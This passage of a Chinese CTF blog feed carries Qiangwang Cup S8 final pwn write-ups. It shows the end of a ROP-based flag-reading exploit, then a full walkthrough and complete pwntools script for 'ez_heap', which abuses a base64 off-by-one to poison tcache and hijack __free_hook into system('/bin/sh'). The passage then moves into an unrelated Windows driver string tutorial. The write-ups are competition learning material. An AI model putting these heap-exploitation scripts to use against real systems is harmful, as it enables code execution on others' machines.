class="number">0x10</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,decrypt(<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">0x20</span>))</span><br><span class="line">book=code_base+<span class="number">0x4080</span> </span><br><span class="line">edit(<span class="number">3</span>,decrypt(p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(book+<span class="number">0x18</span>-<span class="number">0x18</span>)+p64(book+<span class="number">0x18</span>-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>))<span class="comment">#+p64(0x30)+p64(0xc0)))</span></span><br><span class="line">edit(<span class="number">14</span>,decrypt(p64(<span class="number">0x30</span>)+p64(<span class="number">0xc0</span>)))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,decrypt(p64(code_base+<span class="number">0x4100</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;__environ&#x27;</span>])))</span><br><span class="line"><span class="comment">#edit(0,decrypt(p32(0x10)*4))</span></span><br><span class="line">edit(<span class="number">0</span>,p32(<span class="number">0x10</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">res=encrypt(p.recv(<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(res.<span class="built_in">hex</span>())</span><br><span class="line">stack=u64(res[:<span class="number">8</span>])-<span class="number">0x138</span></span><br><span class="line">success(<span class="string">&#x27;stack: &#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(4,decrypt(b&#x27;a&#x27;*0x20))</span></span><br><span class="line">leave=code_base+<span class="number">0x1AA4</span></span><br><span class="line">pop_rdi=libc_addr+<span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi=libc_addr+<span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_ret_10=libc_addr+<span class="number">0x00000000000dfc12</span></span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0xa0</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#add(4,decrypt(p64(pop_rdi)))</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x4350</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x360</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(heap_addr+<span class="number">0x4350</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;open&#x27;</span>])+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x390</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(heap_addr)+p64(pop_rdx_ret_10)+p64(<span class="number">0x30</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3c0</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(libc_addr+libc.sym[<span class="string">&#x27;read&#x27;</span>])+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3e0</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(heap_addr)+p64(pop_rdx_ret_10)+p64(<span class="number">0x30</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3e0</span>+<span class="number">0x30</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(libc_addr+libc.sym[<span class="string">&#x27;write&#x27;</span>])+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(stack))</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x555555555aa4&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_addr+<span class="number">0x358</span>)+p64(leave)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里插个题外话，可能纯做 Pwn 的师傅不太清楚，Crypto 这个库安装使用以下命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install cryptodome</span><br></pre></td></tr></table></figure><h2 id="ez-heap"><a href="#ez-heap" class="headerlink" title="ez_heap"></a>ez_heap</h2><p><a href="ez_heap_c39239d7dd7612062b2f9a864512e346.zip">附件下载</a></p><p>环境准备就不过多赘述了，道理都是一样的。</p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>堆菜单实现了存储 base64 编码和解码的增删查，虽然说菜单上看着有改的操作，也确实有对应的函数，但是没有实装。</p><img src="/2024/12/08/qwb2024_final/16.png" class=""><p>同样的，也来分析这些函数。</p><h4 id="base64编码增"><a href="#base64编码增" class="headerlink" title="base64编码增"></a>base64编码增</h4><img src="/2024/12/08/qwb2024_final/17.png" class=""><p>根据输入的长度和回车的判断，去分配堆块，而这里分配的长度是 <code>4*len/3 + 4</code>，还算是留有余地，几乎不能够溢出。</p><h4 id="base64解码增"><a href="#base64解码增" class="headerlink" title="base64解码增"></a>base64解码增</h4><img src="/2024/12/08/qwb2024_final/18.png" class=""><p>这里需要注意的点来了，它这里分配的长度是 <code>3*len/4</code>，这个长度比较极限但是它如果强制要求你的 len 必须是 4 的倍数其实也不能利用，但是没有，所以这里打个 tag，后续着重分析这里的解码函数。</p><h4 id="base64编码删"><a href="#base64编码删" class="headerlink" title="base64编码删"></a>base64编码删</h4><img src="/2024/12/08/qwb2024_final/19.png" class=""><p>删不存在 UAF。</p><hr><p>后面的base64解码删，和输出堆块就不一一演示了，都很正常的实现。</p><p>这里想起之前讲到的 base64 解码增，来看看解码函数的实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">base64decode</span><span class="params">(<span class="type">char</span> *a1, <span class="type">unsigned</span> __int64 len, <span class="type">char</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//一大堆定义</span></span><br><span class="line">  v16 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v16 &gt;= len )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    *a3 = ((v15 &lt;&lt; <span class="number">6</span>) + (v14 &lt;&lt; <span class="number">12</span>) + (v13 &lt;&lt; <span class="number">18</span>) + v9) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    a3[<span class="number">1</span>] = ((v15 &lt;&lt; <span class="number">6</span>) + (v14 &lt;&lt; <span class="number">12</span>) + v9) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    a3[<span class="number">2</span>] = (v15 &lt;&lt; <span class="number">6</span>) + v9;</span><br><span class="line">    a3 += <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把中间一大段去掉，保留收尾，可以发现循环条件是 v16&gt;&#x3D;len，而 a3 的输出指针每次 +3，因此这个函数在输入长度为 4 的倍数的时候是绝对好使的，但是输入是由我们控制的，因此长度可以不为 4 的倍数，而不为 4 的倍数可能会导致分配的空间不够从而导致溢出。</p><h3 id="EXP编写-1"><a href="#EXP编写-1" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>首先进行漏洞的验证。</p><p>交互函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter your choice: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add1</span>(<span class="params">content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add2</span>(<span class="params">content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free1</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free2</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show2</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">8</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure><p>首先看看编码一个 0x19 长度的字符串，但是去掉编码后的最后一个字节，我们来计算一下。</p><p>0x19 长度的字符编码之后应该是 0x24 字节，去掉一个字节变成 0x23 字节，然后这个长度进入选项 2，malloc 的参数为 <code>0x23/4*3</code>，即得到 0x18，所以最终分配得到 0x20 大小的 <code>chunk</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x19</span>)[:-<span class="number">1</span>])<span class="comment">#0</span></span><br></pre></td></tr></table></figure><p>可以发现，最终的 top chunk 的 size 明显出了问题</p><img src="/2024/12/08/qwb2024_final/20.png" class=""><p>需要分析一下为什么出现了 410061 这样奇怪的值，图中可以看出来我的输入是 <code>YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQ=</code>，最小化之后发现主要的问题就是 <code>YQ=</code> 解析成了 <code>61 00 41</code> 这样的字节，来看看原理。</p><p><code>YQ</code> 解析成第一个 <code>a</code> 不奇怪，<code>Q=</code> 解析出第二个 <code>00</code> 也不奇怪，这个 <code>=</code> 和另外一个字节（0字节）解析成了 <code>A</code>，来看看为什么。</p><p>看到对最后一个字节的解析</p><img src="/2024/12/08/qwb2024_final/21.png" class=""><p>它使用 <code>strchr</code> 去查找该字符串在 base 表所处的位置，对于这个函数来说，如果如果找到了则返回该字符的指针，如果找不到返回 NULL，而找零字节能不能找到呢？能！就在字符串最后面，所有字符串都是 0 结尾的，所以找到的末尾指针减去首指针得到了 0x41，而 &#x3D; 又等同于 0，因此看到 <code>a[2]=(v15&lt;&lt;6)+v9</code>，也能理所当然地知道为啥是 <code>A</code> 了。</p><p>但是这样不太自由，因为会写 size 三个字节，因此可以考虑扩展长度，让它只能溢出一个 A 字节，这样这个 A 就能被覆盖到 size 里面构造堆重叠，然后打 tcache bin attack劫持 free hook就行了。</p><hr><p>所以还是先泄露地址，这里虽然限制了 0x400，但是别忘了 base64编码可以扩展长度，因此很轻松构造一个unsorted bin来泄露地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add1(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>)<span class="comment">#0</span></span><br><span class="line">add1(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>)<span class="comment">#1</span></span><br><span class="line">free1(<span class="number">0</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x9</span>))<span class="comment">#0</span></span><br><span class="line">show2(<span class="number">0</span>)</span><br><span class="line">libc_addr=(u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)&amp;<span class="number">0xFFFFFFFFFFFFFF000</span>)-<span class="number">0x1ed000</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>这里还有一个需要注意的点，你泄露的 libc 的地址很不幸最低 2 位十六进制都是 0，所以 puts 带不出来，因此需要多覆盖一个字节才行。</p><img src="/2024/12/08/qwb2024_final/22.png" class=""><p>libc 地址有了后面就是简单的重叠堆构造 uaf，但同样需要注意 tcache bin 有数量检测，如果正常 free 一个 tcache 再修改 fd，则分配不出来这个任意地址的 tcache，必须要free两个堆块，然后再 edit 后进入的堆块才能够成功分配出来。</p><p>分配出来就直接打 tcache bin 写 system 即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>))<span class="comment">#1</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free2(<span class="number">4</span>)</span><br><span class="line">free2(<span class="number">3</span>)</span><br><span class="line">free2(<span class="number">1</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span>)[:-<span class="number">1</span>])<span class="comment">#1</span></span><br><span class="line">free2(<span class="number">2</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>])))<span class="comment">#2</span></span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))<span class="comment">#3</span></span><br><span class="line">add2(base64.b64encode(p64(libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>])))</span><br><span class="line">free2(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><img src="/2024/12/08/qwb2024_final/23.png" class=""><p>至此艺术已成。</p><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;47.94.85.95&#x27;,&#x27;37083&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter your choice: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add1</span>(<span class="params">content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add2</span>(<span class="params">content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free1</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free2</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show2</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">8</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add1(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>)<span class="comment">#0</span></span><br><span class="line">add1(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>)<span class="comment">#1</span></span><br><span class="line">free1(<span class="number">0</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x9</span>))<span class="comment">#0</span></span><br><span class="line">show2(<span class="number">0</span>)</span><br><span class="line">libc_addr=(u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)&amp;<span class="number">0xFFFFFFFFFFFFFF000</span>)-<span class="number">0x1ed000</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>))<span class="comment">#1</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free2(<span class="number">4</span>)</span><br><span class="line">free2(<span class="number">3</span>)</span><br><span class="line">free2(<span class="number">1</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span>)[:-<span class="number">1</span>])<span class="comment">#1</span></span><br><span class="line">free2(<span class="number">2</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>])))<span class="comment">#2</span></span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))<span class="comment">#3</span></span><br><span class="line">add2(base64.b64encode(p64(libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>])))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">free2(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">同样的，决赛也出了两道pwn题，感觉挺有意思的，来补补wp。</summary>
    
    
    
    <category term="比赛复盘" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/"/>
    
    <category term="强网杯S8决赛" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS8%E5%86%B3%E8%B5%9B/"/>
    
    <category term="Pwn" scheme="https://xia0ji233.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/%E5%BC%BA%E7%BD%91%E6%9D%AFS8%E5%86%B3%E8%B5%9B/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>windows驱动开发（1）——Windows驱动字符串</title>
    <link href="https://xia0ji233.github.io/2024/11/24/WindowsDriver1/"/>
    <id>https://xia0ji233.github.io/2024/11/24/WindowsDriver1/</id>
    <published>2024-11-24T15:00:00.000Z</published>
    <updated>2025-01-20T02:05:53.271Z</updated>
    
    <content type="html"><![CDATA[<p>来简单实战几个字符串API</p><span id="more"></span><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>ASCII 字符和宽字符的版本分别是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RtlInitAnsiString</span><br><span class="line">RtlInitUnicodeString</span><br></pre></td></tr></table></figure><p>第一个参数都是对应的字符串结构体的指针，也就是说，在使用的时候需要先定义一个结构体变量再去使用这个 API 去初始化字符串变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPSTR str2 = <span class="string">&quot;123456789 hello&quot;</span>;</span><br><span class="line">ANSI_STRING astr;</span><br><span class="line">RtlInitAnsiString(&amp;astr, str2);</span><br><span class="line"></span><br><span class="line">LPWSTR str = <span class="string">L&quot;123456789 hello&quot;</span>;</span><br><span class="line">UNICODE_STRING ustr;</span><br><span class="line">RtlInitUnicodeString(&amp;ustr, str);</span><br></pre></td></tr></table></figure><p>使用格式化字符串输出的 <code>%Z</code> 和 <code>%wZ</code> 可以直接输出该字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line">kprintf((<span class="string">&quot;%Z\n&quot;</span>), astr);</span><br><span class="line">kprintf((<span class="string">&quot;%wZ\n&quot;</span>), ustr);</span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="/2024/11/24/WindowsDriver1/1.png" class=""><h2 id="相互转换"><a href="#相互转换" class="headerlink" title="相互转换"></a>相互转换</h2><p>宽字符可以变 ASCII 字符，ASCII 字符也可以变宽字符。前提是它们都是 ASCII 范围内可以在不改变内容的情况下转换，如果使用 Unicode 字符将 Unicode 字符串转为 ASCII 字符串则可能会出现乱码。</p><p>事实证明想多了，即使是 ASCII 字符串，也能存放 Unicode 字符串。</p><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fltKernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"><span class="function">VOID <span class="title">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Bye!\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    reg_path;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;Hello!\n&quot;</span>));</span><br><span class="line">    driver-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">    ANSI_STRING astr;</span><br><span class="line">    UNICODE_STRING ustr;</span><br><span class="line">    LPWSTR str = <span class="string">L&quot;123456789 hello哈哈&quot;</span>;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;ustr, str);</span><br><span class="line">    <span class="built_in">RtlUnicodeStringToAnsiString</span>(&amp;astr, &amp;ustr, TRUE);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;%p,%p\n&quot;</span>), ustr.Buffer, astr.Buffer);</span><br><span class="line">    <span class="built_in">kprintf</span>((<span class="string">&quot;%Z\n&quot;</span>), astr);</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><img src="/2024/11/24/WindowsDriver1/2.png" class=""><p>这里的 API <code>RtlUnicodeStringToAnsiString(&amp;astr, &amp;ustr, TRUE);</code>，前两个参数，一个是目的字符串指针，一个是源字符串指针。第三个参数 TRUE 表示为目的字符串新分配内存，FALSE 表示不分配内存。</p><p>如果第三个参数设置为 FALSE 一定要注意，它会在 astr.buffer 中写入，因此一定要确保指向了一个正确的可写的内存，否则就会面临蓝屏。</p><p><code>RtlAnsiStringToUnicodeString</code> 这个 API 同理可得。</p><p>注意，使用<code>RtlUnicodeStringToAnsiString/RtlAnsiStringToUnicodeString</code>函数时，需要在使用完后调用<code>RtlFreeAnsiString/RtlFreeUnicodeString</code>函数来释放所分配的缓冲区，否则会产生内存泄露。</p><h2 id="数字与字符串之间的转换"><a href="#数字与字符串之间的转换" class="headerlink" title="数字与字符串之间的转换"></a>数字与字符串之间的转换</h2><p>在传统的 <code>CHAR */WCHAR *</code> 字符串中，我们只有 atoi，sprintf 等传统函数做数字与字符串之间的转换。 而内核就有很方便的 api 做转换，下面来看一个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 